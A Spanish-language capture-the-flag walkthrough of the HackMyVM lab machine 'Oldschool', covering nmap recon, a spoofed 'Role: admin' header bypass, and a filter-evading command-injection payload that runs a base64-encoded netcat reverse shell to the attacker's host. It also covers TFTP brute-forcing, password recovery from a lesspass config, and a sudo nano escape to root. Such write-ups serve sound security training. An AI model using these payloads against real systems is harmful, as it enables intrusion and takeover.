---
layout: post
title: Oldschool - Hackmyvm
tags: [ctf, hackmyvm]
---

**Autor**: Cromiphi \\
**Dificultad**: Medio

![img](/imgs/write-ups/hackmyvm/oldschool/oldschool.png#center)

## Reconocimiento

Lo primero, un escaneo rápido de la máquina:

```
sudo nmap -p- 192.168.1.85       
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-21 14:54 EST
Nmap scan report for 192.168.1.85
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
23/tcp open  telnet
80/tcp open  http
MAC Address: 08:00:27:24:8D:92 (Oracle VirtualBox virtual NIC)
```

### 80 (http)

Desde la página principal, al intentar hacer click en "tool" me redirige a "verification.php" y seguidamente a "denied.php" por lo que se tiene que producir una autentificación de algún tipo. Para esto utilizo Burpsuite.

Muy importante seleccionar en burpsuite que muestre también las respuestas ya que es ahí donde se encuentra la clave.

- Primero realizo la petición a "verification.php":

```
GET /verification.php HTTP/1.1
Host: 192.168.1.85
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.1.85/
Upgrade-Insecure-Requests: 1
```

- A continuación, en la respuesta del servidor, encuentro una cabecera "Role" cuyo valor es "not admin".

```
HTTP/1.1 302 Found
Date: Wed, 21 Dec 2022 20:02:10 GMT
Server: Apache/2.4.54 (Debian)
Role: not admin
Location: ./denied.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

- Conociendo esto, pruebo a realizar la misma petición que antes pero añadiendo la cabecera **"Role: admin"**:

```
GET /verification.php HTTP/1.1
Host: 192.168.1.85
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.1.85/
Role: admin  <------- Añadida
Upgrade-Insecure-Requests: 1
```

Ahora con la cabecera añadida, tengo acceso a "pingertool2000.php"

![img](/imgs/write-ups/hackmyvm/oldschool/oldschool_1.png#center)

## Explotación

En esta página es posible realizar un "command injection" y obtener una shell en el servidor.

Command injection:

- No está permitido el uso de comandos como "bash" o "echo" por lo que me salto esta restriccion usando commilas. Ej -> bas''h
- No está permitido el caracter ";" por lo que uso ${IFS}%0a para añadir un comando.
- Para evitar problemas de formato u otros posibles filtros, uso base64.

Primero obtengo en base64 la "reverse shell" a utilizar, en este caso uso una shell básica mediante netcat.

```
$ echo -n "nc -e /bin/bash 192.168.1.72 1239" | base64                                          
bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMS43MiAxMjM5
```

En burpsuite modifico el valor "url" por mi payload para obtener la shell.

```
url=asdf.com${IFS}%0aec''ho%09"bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMS43MiAxMjM5"%09|%09base64%09-d%09|%09bas''h
```

Y con esto he obtenido acceso en el servidor como www-data.

```
$ nc -lvnp 1239
listening on [any] 1239 ...
connect to [192.168.1.72] from (UNKNOWN) [192.168.1.85] 43188
$ whoami
www-data
```

Desde dentro del servidor, ejecuto "linpeas.sh" para realizar una enumeración de posibles métodos de escalado de privilegios y encuentro que se ha ejecutado el siguiente comando:

```
/usr/sbin/in.tftpd --listen --user fanny --address :69 --secure /srv/tftp
```

Con esta información utilizo el módulo "tftpbrute" de metasploit.

```
msf6 > use auxiliary/scanner/tftp/tftpbrute
[...] (configuración opciones)
msf6 auxiliary(scanner/tftp/tftpbrute) > run

[+] Found passwd.cfg on 192.168.1.85
[+] Found pwd.bin on 192.168.1.85
[+] Found pwd.cfg on 192.168.1.85
[+] Found sip.cfg on 192.168.1.85
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Y ahora intento descargar los archivos.

```
$ tftp 192.168.1.85
tftp> connect
(to) 192.168.1.85
tftp> status
Connected to 192.168.1.85.
Mode: netascii Verbose: off Tracing: off Literal: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
tftp> get passwd.cfg
```

El único archivo que consigo descargar es "passwd.cfg".

```
$ cat passwd.cfg 
# lesspass default config password generator
# do not delete

lesspass oldschool.hmv fanny 14mw0nd32fu1
```

Con esta información, navego a la página oficial de [lesspass](https://www.lesspass.com/#/) y relleno con los datos de passwd.cfg para obtener una contraseña.

![img](/imgs/write-ups/hackmyvm/oldschool/oldschool_2.png#center)

Con esta contraseña inicio sesión mediante telnet y el usuario "fanny".

```
$ telnet 192.168.1.85 23
Trying 192.168.1.85...
Connected to 192.168.1.85.
Escape character is '^]'.
Debian GNU/Linux 11
oldschool.hmv login: fanny
Password: 
Linux oldschool.hmv 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
[...]
fanny@oldschool:~$ :)
```

## Escalado de privilegios

Ejecutando sudo -l se puede ver que fanny tiene permisos para ejecutar "nano" como root sobre el fichero /etc/snmp/snmpd.conf.

```
fanny@oldschool:~$ sudo -l
Matching Defaults entries for fanny on oldschool:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fanny may run the following commands on oldschool:
    (ALL : ALL) NOPASSWD: /usr/bin/nano /etc/snmp/snmpd.conf
```

Se puede escalar privilegios de la siguiente manera [GTFObins Nano](https://gtfobins.github.io/gtfobins/nano/#sudo):

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

Y con esto se termina la máquina.

```
$ sudo /usr/bin/nano /etc/snmp/snmpd.conf
[...]
# id; hostname
uid=0(root) gid=0(root) groups=0(root)
oldschool.hmv
# :) 
```

Muchas gracias  **Cromiphi** por esta máquina.
